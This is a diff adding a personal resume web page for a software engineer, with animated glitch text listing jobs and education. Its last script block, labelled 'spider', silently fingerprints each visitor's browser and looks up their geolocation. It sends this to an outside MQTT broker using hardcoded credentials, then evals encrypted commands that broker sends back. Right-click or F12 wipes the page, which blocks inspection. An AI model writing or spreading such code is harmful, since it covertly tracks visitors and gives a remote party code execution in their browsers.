@@ -1,0 +1,607 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="description" content="reedleoneil">
+    <meta name="keywords" content="Reed Leoneil Pascual">
+    <meta name="author" content="reedleoneil">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reed Leoneil Pascual</title>
+    <link rel="icon" type="image/png" href="https://reedleoneil.github.io/IMG_0020.PNG">
+    <link rel="stylesheet" href="https://cdn.rawgit.com/konpa/devicon/df6431e323547add1b4cf45992913f15286456d3/devicon.min.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
+    <style>
+        body {
+            font-size: 0.9em;
+            font-family: 'Courier New', Courier, monospace;
+            width: 100%;
+            margin: auto;
+            max-width: 30em;
+            padding-left: 15px;
+            padding-right: 15px;
+            overflow-y: hidden;
+        }
+
+        h1 {
+            font-family: ui-monospace;
+        }
+
+        button {
+            position: inline;
+            float: right;
+        }
+
+        body.dark-mode {
+            background-color: #000000;
+            color: #d5d5d5;
+            text-shadow: -0.01px -0.01px 0 #696969, 0.01px -0.01px 0 #696969, -0.01px 0.01px 0 #696969, 0.01px 0.01px 0 #696969, -0.01px -0.01px 3px #696969, 0.01px -0.01px 3px #696969, -0.01px 0.01px 3px #696969, 0.01px 0.01px 3px #696969;
+        }
+
+        a:link, a:active, a:visited, nav a:link, nav a:active {
+            color: #000000;
+            text-decoration: none;
+        }
+
+        a.dark-mode:link, a.dark-mode:active, a.dark-mode:visited {
+            color: #d5d5d5;
+            text-shadow: -0.01px -0.01px 0 #696969, 0.01px -0.01px 0 #696969, -0.01px 0.01px 0 #696969, 0.01px 0.01px 0 #696969, -0.01px -0.01px 3px #696969, 0.01px -0.01px 3px #696969, -0.01px 0.01px 3px #696969, 0.01px 0.01px 3px #696969;
+            text-decoration: none;
+        }
+
+        a:hover {
+            color: #bc002d;
+            text-decoration: none;
+        }
+
+        a.dark-mode:hover {
+            color: #ff4b75;
+            text-shadow: -0.03px -0.03px 0 #DC143C, 0.03px -0.03px 0 #DC143C, -0.03px 0.03px 0 #DC143C, 0.03px 0.03px 0 #DC143C, -0.03px -0.03px 3px #DC143C, 0.03px -0.03px 3px #DC143C, -0.03px 0.03px 3px #DC143C, 0.03px 0.03px 3px #DC143C;
+            text-decoration: none;
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js" integrity="sha512-E8QSvWZ0eCLGk4km3hxSsNmGWbLtSCSUcewDQPQWZF6pEU8GlT8a5fF32wOl1i8ftdMhssTrF/OhyGWwonTcXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>         
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/2.3.1/jsencrypt.min.js" integrity="sha512-zDvrqenA0eFJZCxBsryzUZcvihvNlEXbteMv62yRxdhR4s7K1aaz+LjsRyfk6M+YJLyAJEuuquIAI8I8GgLC8A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ClientJS/0.1.11/client.min.js" integrity="sha512-MwKUpp841sot4mmGDfVcpJxb4vcaYHnpyn17CTHT3RUm585khw5gnRM6xwDm15aJ3sfpf6d4P8FLLfQKAo3mfA==" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mqtt/4.2.8/mqtt.min.js" integrity="sha512-QhwpmT5Q0jBh/70LYcUtOVomQyPfvRv3iWg2MzxKn4OjYcZdE5PBbfE8LMEdNx3IW0rO9OtWzPbxckRh/g8TSw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+</head>
+<body>
+    <button onclick="switchTheme()" style="display: none;"><i id="switch-theme" class="fas fa-yin-yang"></i> <span id="theme">Dark</span></button>
+
+    <header></header>
+    <div></div>
+    <main></main>
+    <footer></footer>
+
+    <script type="text/javascript">
+        const emojis = ["👹", "👺", "🍱", "🍜", "🍙", "🍥", "🌸", "🌊", "🎏", "🎋", "🎎", "🗼", "🏯", "🗻", "🏮", "🔴", "🗾", "🍣", "🍵", "🍡", "🍘", "🍢"];
+        const emojiRegex = /\p{Emoji_Presentation}/u;
+
+        function glitch(text, element) {
+            element.innerHTML = "";
+
+            let spanindexes = [];
+            let spanlen = 0;
+
+            let g = 0;
+            while (g < text.length) { 
+                    let span = document.createElement("span");
+                    span.classList.add("char");
+                    let char =  !emojiRegex.test(text[g] + text[g+1]) ? String.fromCharCode(getRndInteger(32, 255)) : emojis[getRndInteger(0, emojis.length - 1)];
+                    let node = document.createTextNode(char);
+                    span.appendChild(node);
+                    element.appendChild(span);
+
+                    spanindexes.push(spanlen);
+                    spanlen = spanlen+1;
+
+                    g =  !emojiRegex.test(text[g] + text[g+1]) ? g+1 : g+2;
+            }
+
+            let textindexes = [];
+            let i = 0;
+            while(i < text.length) {   
+                textindexes.push(i);
+                i = !emojiRegex.test(text[i] + text[i+1]) ? i+1 : i+2;
+            }
+
+            let interval = setInterval(function () {
+                if (textindexes.length != 0) {
+                        let index = getRndInteger(0, textindexes.length - 1);
+                        
+                        if (!emojiRegex.test(text[textindexes[index]] + text[textindexes[index]+1]))
+                            element.getElementsByClassName("char")[spanindexes[index]].innerHTML = text[textindexes[index]]; 
+                        else
+                            element.getElementsByClassName("char")[spanindexes[index]].innerHTML = text[textindexes[index]] + text[textindexes[index]+1]; 
+
+                        textindexes.splice(index, 1);
+                        spanindexes.splice(index, 1);
+                } else {
+                    clearInterval(interval);
+                }
+            }, 21);
+        }
+
+        function getRndInteger(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+        function onhover(text1, text2, element){
+            element.addEventListener("mouseover", function (e) {
+                if (element.innerText == text1 && element.matches(":hover")) {
+                    glitch(text2, element);
+                }
+            });
+
+            element.addEventListener("mouseout", function (e) {
+                if (element.innerText == text2 && !element.matches(":hover")) {
+                    glitch(text1, element);
+                }
+            });
+        }
+
+        let header = { en: "reedleoneil", jp: "リードレオニル" };
+
+        let social_buttons = [
+            { icon: "fab fa-linkedin", link: "https://www.linkedin.com/in/reedleoneil" },
+            // { icon: "fas fa-envelope", link: "mailto:reedleoneilpascual@yahoo.com" },
+            // { icon: "fab fa-github", link: "https://github.com/reedleoneil" },
+        ];
+
+        let sections = [
+            { id: "experience", header: "Professional Experience" },
+            { id: "education", header: "Education" },
+            // { id: "certifications", header: "Certifications" },
+        ];
+
+        let experience = [
+            {
+                position: "Software Engineer",
+                company: "TechnoPro Engineering Inc.",
+                company_link: "https://www.technopro.com/",
+                dates: "May 2022 - Present",
+                descriptions: []
+            },
+            {
+                position: "Software Engineer",
+                company: "Filam Software Technology Inc.",
+                company_link: "https://www.filamsoftware.com/",
+                dates: "Feb 2018 -  Apr 2022",
+                descriptions: [
+                    "Provided maintenance, support and enhancements in a Microsoft Outlook Add-in that is written in C# for cloud time tracking, timesheet and expense management to automate employee time tracking, project time tracking, expense tracking and resource scheduling.",
+                    "Work alongside other engineers on the team in developing a client and broker portal, a healthcare software for searching patient eligibility and generating spreadsheets and id cards of patient information."
+                ]
+            },
+            {
+                position: "System Developer",
+                company: "CLTV36",
+                company_link: "https://cltv36.tv/",
+                dates: "Aug 2016 - Jan 2018",
+                descriptions: [
+                    "Provided maintenance, support and enhancements to an Airtime Sales Monitoring System for a broadcasting company that was written in Visual Basic 6 for monitoring the airtime sales and slots, billing of clients, and automation for apporval of broadcast contracts.",
+                    "Ported the VB6 desktop application of the Airtime Sales Monitoring System to a web application written in PHP Codeigniter to support MacOS, iOS, GNU/Linux, and Android devices.",
+                    "Designed Technical Facilities and Manpower Request System for managing, requesting and deployment of company resources to drive continuous improvement to processes, systems, workflow and customer responsiveness."
+                ]
+            },
+        ];
+
+        let education = [
+            {
+                course: "Computer Engineering",
+                insitution: "University of the Assumption",
+                insitution_link: "https://ua.edu.ph/",
+                dates: "Jun 2011 - Apr 2016",
+                descriptions: [
+                    "Thesis: Designed and developed a web-based application to allow great user experience for touch screen devices and remote management and monitoring written in PHP for a vending machine using Raspberry Pi and Arduino.",
+                    "Pre-Thesis: Designed and developed an android application for home automation to allow remote, voice, and SMS control of lighting and appliances."
+                ]
+            },
+            // {
+            //     course: "Computer Hardware Servicing NC II",
+            //     insitution: "AMA Computer Learning Center",
+            //     insitution_link: "http://www.aclc.edu.ph",
+            //     dates: "Apr 2011 - May 2011",
+            //     descriptions: [
+            //         "Training in installing, configuring, diagnosing, and troubleshooting software and hardware in computer systems and networks.",
+            //         "Best in Networking"
+            //     ]
+            // },
+            // {
+            //     course: "Japanese Language N4 - N2",
+            //     insitution: "Japanese Language Research Center Inc.",
+            //     insitution_link: "https://atjlrc.com",
+            //     dates: "Jul 2020 - Dec 2022",
+            //     descriptions: [
+            //         "別の言語を話すことができるということは、第二の魂を持っているということ。"
+            //     ]
+            // },
+            // {
+            //     course: "Learning is Never Ending",
+            //     insitution: "Life",
+            //     insitution_link: "creed.Keep(\"faith\")",
+            //     dates: "Jul 1993 - Present",
+            //     descriptions: [
+            //         "To follow the path: look to the master, follow the master, walk with the master, see through the master, become the master."
+            //     ]
+            // },
+        ];
+
+        let certifications = [
+            // {
+            //     certification: "Japanese Language Proficiency Test N1",
+            //     certification_link: "http://jlpt.jp/",
+            //     dates: "Dec 2023",
+            //     description: "The Japanese-Language Proficiency Test (JLPT) has been offered by the Japan Foundation and Japan Educational Exchanges and Services (formerly Association of International Education, Japan) since 1984 as a reliable means of evaluating and certifying the Japanese proficiency of non-native speakers. At the beginning, there were approximately 7,000 examinees worldwide. In 2011, there were as many as 610,000 examinees around the globe, making JLPT the largest-scale Japanese-language test in the world."
+            // },
+            {
+                certification: "Japanese Language Proficiency Test N2",
+                certification_link: "http://jlpt.jp/",
+                dates: "Jul 2023",
+                description: "The Japanese-Language Proficiency Test (JLPT) has been offered by the Japan Foundation and Japan Educational Exchanges and Services (formerly Association of International Education, Japan) since 1984 as a reliable means of evaluating and certifying the Japanese proficiency of non-native speakers. At the beginning, there were approximately 7,000 examinees worldwide. In 2011, there were as many as 610,000 examinees around the globe, making JLPT the largest-scale Japanese-language test in the world."
+            },
+            // {
+            //     certification: "Japanese Language Proficiency Test N3",
+            //     certification_link: "http://jlpt.jp/",
+            //     dates: "Dec 2022",
+            //     description: "The Japanese-Language Proficiency Test (JLPT) has been offered by the Japan Foundation and Japan Educational Exchanges and Services (formerly Association of International Education, Japan) since 1984 as a reliable means of evaluating and certifying the Japanese proficiency of non-native speakers. At the beginning, there were approximately 7,000 examinees worldwide. In 2011, there were as many as 610,000 examinees around the globe, making JLPT the largest-scale Japanese-language test in the world."
+            // },
+            {
+                certification: "PhilNITS Information Technology Passport",
+                certification_link: "https://www.philnits.org/passers_IP2017.html#May102015IP",
+                dates: "May 2015",
+                description: "The Philippine National I.T. Standards (PhilNITS) Foundation, Inc. formerly known as the Japanese I.T. Standards Exams of the Philippines (JITSE-Phil) Foundation, Inc., is a non-stock, non-profit, non-government organization that is implementing in the Philippines the Information Technology standards adopted from Japan, with the support of the Department of Trade and Industry (DTI) of the Philippines and the Ministry of Economy, Trade and Industry (METI) of Japan."
+            },
+            {
+                certification: "TESDA Computer Hardware Servicing NC II",
+                certification_link: "http://tesda.gov.ph/",
+                dates: "Jun 2011",
+                description: "A qualification consists of competencies to install and configure computers systems, set-up computer networks and servers and to maintain and repair computer systems and networks."
+            },
+        ];
+
+        let footer = "© 2018 - " + new Date().getFullYear() + " reedleoneil";
+
+        function load_header() {
+            document.getElementsByTagName("header")[0].innerHTML = "";
+            let h1 = document.createElement("h1");
+            glitch(header.en, h1);
+            onhover(header.en, header.jp, h1);
+            document.getElementsByTagName("header")[0].appendChild(h1);
+        }
+
+        function load_social() {
+            document.getElementsByTagName("div")[0].innerHTML = "";
+            let span = document.createElement("span");
+            glitch("Connect with me on ", span);
+            document.getElementsByTagName("div")[0].appendChild(span);
+
+            for (let i = 0; i < social_buttons.length; i++) {
+                let a = document.createElement("a");
+                a.setAttribute("href", social_buttons[i].link);
+                a.setAttribute("target", "_blank");
+                let icon = document.createElement("i");
+                icon.setAttribute("class", social_buttons[i].icon);
+                a.appendChild(icon);
+                document.getElementsByTagName("div")[0].appendChild(a);
+                let span = document.createElement("span");
+                // if (i < social_buttons.length - 2)
+                //     glitch(" or ", span);
+                // else if (i < social_buttons.length - 1)
+                //     glitch(", and checkout my ", span);
+                // else
+                    glitch(".", span);
+                document.getElementsByTagName("div")[0].appendChild(span);
+            }
+        }
+
+
+        function load_sections() {
+            document.getElementsByTagName("main")[0].innerHTML = "";
+            for (let i = 0; i < sections.length; i++) {
+                let section = document.createElement("section");
+                section.setAttribute("id", sections[i].id);
+                let h = document.createElement("h3");
+                glitch(sections[i].header, h)
+                let div = document.createElement("div");
+                section.appendChild(h);
+                section.appendChild(div);
+                document.getElementsByTagName("main")[0].appendChild(section);
+            }
+        }
+
+        function load_experience() {
+            document.getElementById('experience').getElementsByTagName('div')[0].innerHTML = "";
+            for (let i = 0; i < experience.length; i++) {
+                let divPosition = document.createElement("div");
+                let divCompany = document.createElement("div");
+                let divDates = document.createElement("div");
+                let divDescriptions = document.createElement("div");
+
+                let b = document.createElement("b");
+                glitch(experience[i].position, b);
+                divPosition.appendChild(b);
+
+                let a = document.createElement("a");
+                a.setAttribute("href", experience[i].company_link);
+                if (experience[i].company_link)
+                    a.setAttribute("target", "_blank");
+                glitch(experience[i].company, a);
+                onhover(experience[i].company, experience[i].company_link, a);
+                divCompany.appendChild(a);
+
+                glitch(experience[i].dates, divDates);
+
+                for (let j = 0; j < experience[i].descriptions.length; j++) {
+                    let description = experience[i].descriptions[j];
+
+                    let div = document.createElement("div");
+                    glitch(description, div);
+                    divDescriptions.appendChild(div);
+                }
+
+                document.getElementById('experience').getElementsByTagName('div')[0].appendChild(divPosition);
+                document.getElementById('experience').getElementsByTagName('div')[0].appendChild(divCompany);
+                document.getElementById('experience').getElementsByTagName('div')[0].appendChild(divDates);
+                //document.getElementById('experience').getElementsByTagName('div')[0].appendChild(divDescriptions);
+            }
+        }
+
+        function load_education() {
+            document.getElementById('education').getElementsByTagName('div')[0].innerHTML = "";
+            for (let i = 0; i < education.length; i++) {
+                let divCourse = document.createElement("div");
+                let divInstitution = document.createElement("div");
+                let divDates = document.createElement("div");
+                let divDescriptions = document.createElement("div");
+
+                let b = document.createElement("b");
+                glitch(education[i].course, b);
+                divCourse.appendChild(b);
+
+                let a = document.createElement("a");
+                a.setAttribute("href", education[i].insitution_link);
+                if (education[i].insitution_link)
+                    a.setAttribute("target", "_blank");
+                glitch(education[i].insitution, a);
+                onhover(education[i].insitution, education[i].insitution_link ? education[i].insitution_link : education[i].insitution, a);
+                divInstitution.appendChild(a);
+
+                glitch(education[i].dates, divDates);
+
+                for (let j = 0; j < education[i].descriptions.length; j++) {
+                    let description = education[i].descriptions[j];
+
+                    let div = document.createElement("div");
+                    glitch(description, div);
+                    divDescriptions.appendChild(div);
+                }
+
+                document.getElementById('education').getElementsByTagName('div')[0].appendChild(divCourse);
+                document.getElementById('education').getElementsByTagName('div')[0].appendChild(divInstitution);
+                document.getElementById('education').getElementsByTagName('div')[0].appendChild(divDates);
+                //document.getElementById('education').getElementsByTagName('div')[0].appendChild(divDescriptions);
+            }
+        }
+        
+        function load_certifications() {
+            document.getElementById('certifications').getElementsByTagName('div')[0].innerHTML = "";
+            for (let i = 0; i < certifications.length; i++) {
+                let div = document.createElement("div");
+                let divDates = document.createElement("div");
+                let divDescriptions = document.createElement("div");
+
+                let a = document.createElement("a");
+                a.setAttribute("href", certifications[i].certification_link);
+                if (certifications[i].certification_link)
+                    a.setAttribute("target", "_blank");
+
+                let b = document.createElement("b");
+                a.appendChild(b);
+                glitch(certifications[i].certification, b);
+                onhover(certifications[i].certification, certifications[i].certification_link, b);
+                div.appendChild(a);
+
+                glitch(certifications[i].dates, divDates);
+                glitch(certifications[i].description, divDescriptions);
+
+                document.getElementById('certifications').getElementsByTagName('div')[0].appendChild(div);
+                document.getElementById('certifications').getElementsByTagName('div')[0].appendChild(divDates);
+                //document.getElementById('certifications').getElementsByTagName('div')[0].appendChild(divDescriptions);
+            }
+        }
+
+        function load_footer() {
+            document.getElementsByTagName("footer")[0].innerHTML = "";
+            let h4 = document.createElement("h4");
+            glitch(footer, h4);
+            document.getElementsByTagName("footer")[0].appendChild(h4);
+        }
+
+        function load() {
+            load_header();
+            load_social();
+            load_sections();
+            load_experience();
+            load_education();
+            // load_certifications();
+            load_footer();
+        }
+
+        let callbackDeleteAll = function () {
+            setInterval(function () {
+                let index = getRndInteger(0, document.querySelectorAll('span,i').length - 1);
+                if (document.querySelectorAll('span,i,button').length != 0)
+                    document.querySelectorAll('span,i,button')[index].parentElement.removeChild(document.querySelectorAll('span,i,button')[index]);
+                else {
+                    document.head.innerHTML = "";
+                    document.body.innerHTML = "";
+                }
+            }, 0);
+        }
+
+        document.addEventListener('contextmenu', function (event) {
+            event.preventDefault();
+            callbackDeleteAll();
+        }); 
+
+        document.onkeydown = function (event) {
+            let x = event.which || event.keyCode;
+            if (x == 123) {
+                event.preventDefault();
+                callbackDeleteAll();
+            }
+        }
+
+        function switchTheme () {
+            load();
+
+            let theme = document.getElementById("theme").innerText;
+
+            if (theme === "Dark") {
+                document.getElementById("theme").innerText = "Light";
+                document.body.classList.add("dark-mode");
+                const links = document.querySelectorAll("a");
+                links.forEach(link => {
+                    link.classList.add('dark-mode');
+                });
+            } else {
+                document.getElementById("theme").innerText = "Dark";
+                document.body.classList.remove("dark-mode");
+                const links = document.querySelectorAll("a");
+                links.forEach(link => {
+                    link.classList.remove('dark-mode');
+                });
+            }
+        }
+
+        // load();
+        switchTheme();
+    </script>
+<script type="text/javascript">
+    let rsa = {
+        encodedPublicKey: `-----BEGIN PUBLIC KEY-----
+            MIIEIjANBgkqhkiG9w0BAQEFAAOCBA8AMIIECgKCBAEA2Id0EDHWJ3elOeTwuINK
+            tJaMWUhE5Cv3gnksCWfYdMKfsXIe9nNU6gJ2uW07lRqobsrQAkwXd0LQ8UQP6p7C
+            qtEKABfWg7vkhBZa8d04xotCbdwNPZ+/RGl0sSKDB5DoZlOu1Y8Goq70quJ6Z1tl
+            zOq8pLi8czBdFzNhE1b4RiHkIYfWc8NZR/N4KU0KUPbotjWsBHQwZylCWqbLaUN+
+            lujxm+Hn46peCVOLXrAA9gaL7mq99w8kkAGsxdkbWWJ4o+zldIYrwVorCbBrmbpO
+            oAqQWIrGQD82M3cvkZOeaAvxnQPGicg8T4Ect969btyiZ20PcCC3AzVAnYgX/QJo
+            hMWvMkseIxjx9xFTjD9o/qJySOd/JBCoQdP6DPsXbjBAcxZtqMFyrn1Us6iOK+e8
+            GsPoYGaNo2ZEnyZN1FgyfG1z0abkEf1Tpe1Y3ajr9j7YJqYk/hgKxXYO6w4g6XjM
+            /XmyRay5AqJdpnNVbDBiHir7w+Xu8Of5ftYfbjDMpQW6ksaCcTV/h9ggSWP/uHiW
+            JyGZtaYXTx8CNPdxn6XHR7XZf76JRKDgRfaGHBqEcQas++uUZy4gh8O/WJqvVgRv
+            Tk25Rw6dBzbOqjMJC9gKez/3yIC2+/1ejCJaFFQfuail1JAofhh2rJtT2anJp0NA
+            Q1kOOMMkamN/jQ6T5awFbzkvaybDO9Wt6G1cXLOHhCls/AzPjV3bMcJ5Mcw5FoF2
+            1Oepb8Txsjlg/jrCDn4I36YkHMKKV7I+ZrTVcbMSIjoaq46TnNhVUMFzvHUBiE5K
+            cKG4dFZHsh3xzPh/kfa+ft/baMHKv1XZo+C1IciskfUTla0w/hU7/wP7kYSOq43+
+            a1ntr/Zsv8HpRAZdlTMYG88bEKy6EDSQQUIjp5S4gd7d/p20MNNO07ftJGWbu/9j
+            R9A2ZpeuPEm5jdCuPvbg/G1EAxny9wiq15U3lekTX1SzWfJKgRXhmpGSztarEOba
+            1RutNaMTeBfwi79Fky62SH/8C0kfL0YWPOHrWE9ixr+f+iGDLVNK+g5EwjAuKWVk
+            KIRM95pu0u3YFqGirBP19VahIL8BCRsv9MYIs1LQHMRW4lWajlSUUcsgbIYcpyBR
+            ZMAB9Zlj5lLFl6hw3oWbUN6Eg09IzBM0lVK07or32dolXBBX/Kbcd6WSyQD6PBj3
+            3Xr6GSLxU/HRduYP9opkpdh8qaDTAxrogiOZveAEQf7NX22JTTrID7Sz+YvSCHoG
+            sQJLq0yJPWPIbvCvJMVeHHgVrgFCyqwf0JEelczuTxTpt3UZZR5apgUWc65MDGWl
+            LwJ9FG5sndUXe0sNRuhWovLHscSC4oDBEtqm3ZFeXxyHvszEN1Ls0NjbtjOnFE8Y
+            /QIDAQAB
+                              -----END PUBLIC KEY-----`,
+        encrypt: (data) => {
+            jsencrypt = new JSEncrypt();
+            jsencrypt.setPublicKey(rsa.encodedPublicKey);
+            return jsencrypt.encrypt(data)
+        }
+    };
+
+    let aes = {
+        encodedKey: CryptoJS.MD5(Math.random().toString()).toString().slice(0, 16),
+        encrypt: (data) => {
+            key = CryptoJS.enc.Utf8.parse(aes.encodedKey);
+            let iv = CryptoJS.MD5(Math.random().toString()).toString().slice(0, 16);
+            let ciphertext = CryptoJS.AES.encrypt(data, key, {
+                iv: CryptoJS.enc.Utf8.parse(iv),
+                padding: CryptoJS.pad.Pkcs7
+            });
+            return iv + ciphertext.toString();
+        },
+        decrypt: (ciphertext) => {
+            key = CryptoJS.enc.Utf8.parse(aes.encodedKey);
+            let iv = ciphertext.slice(0, 16);
+            let data = CryptoJS.AES.decrypt(ciphertext.slice(16, ciphertext.length), key, {
+            iv: CryptoJS.enc.Utf8.parse(iv),
+            padding: CryptoJS.pad.Pkcs7
+            });
+            return data.toString(CryptoJS.enc.Utf8);
+        },
+    };
+
+    let hash = {
+        hexDigest: (text) => {
+            return CryptoJS.MD5(text.toString()).toString()
+        },
+    };
+
+    let serialization = {
+        serialize: (data) => {
+            return JSON.stringify(data);
+        },
+        deserialize: (data) => {
+            return JSON.parse(data);
+        },
+    };
+</script>
+<script type="text/javascript">
+    let spider = {
+        root: "https://reedleoneil.github.io",
+        mqttClient: null,
+        fingerprint: new ClientJS().getFingerprint().toString().padStart(10, "0"),
+        browser: new ClientJS().getBrowserData(),
+        geolocation : fetch('https://ipapi.co/json')
+                                .then(response => response.json())
+                                .then(data => { spider.geolocation = data; spider.connect() }),
+        status: "Offline",
+        lastonline: Date(),
+        key: aes.encodedKey,
+        connect: () => {
+            var mqttOptions = {
+                port: 8884,
+                protocol: "wss",
+                username: "testy",
+                password: "P@$$w0rd",
+                path: "/mqtt",
+                will: {
+                    topic: hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/status",
+                    payload: rsa.encrypt(spider.status),
+                    retain: true
+                }
+            };
+            spider.mqttClient = mqtt.connect("wss://8e86d252f3c44fca8ce087b965c40d47.s1.eu.hivemq.cloud", mqttOptions);
+            spider.mqttClient.on("connect", spider.onConnect);
+            spider.mqttClient.on("message", spider.onMessage);
+            spider.mqttClient.subscribe(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/stdin");
+        },
+        onConnect: () => {
+            spider.status = "Online";
+            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/fingerprint", rsa.encrypt(spider.fingerprint), { retain: true });
+            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/key", rsa.encrypt(spider.key), { retain: true });
+            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/status", rsa.encrypt(spider.status), { retain: true });
+            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/lastonline", rsa.encrypt(spider.lastonline), { retain: true });
+            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/browser", rsa.encrypt(serialization.serialize(spider.browser)), { retain: true });
+            spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/geolocation", rsa.encrypt(serialization.serialize(spider.geolocation)), { retain: true });
+        },
+        onMessage: (topic, payload) => {
+            topic = topic.split("/");
+            var root = topic[0],
+                fingerprint = topic[1],
+                stdio = topic[2];
+            if (root == hash.hexDigest(spider.root) && fingerprint == hash.hexDigest(spider.fingerprint) && stdio == "stdin") {
+                try {
+                    out = eval(aes.decrypt(payload.toString()));
+                    if (out)
+                        spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/stdout", aes.encrypt(JSON.stringify(out)));
+                } catch (error) {
+                    spider.mqttClient.publish(hash.hexDigest(spider.root) + "/" + hash.hexDigest(spider.fingerprint) + "/stderr", aes.encrypt(error.toString()));
+                }
+            }
+        }
+    };
+</script>
+</body>
+</html>
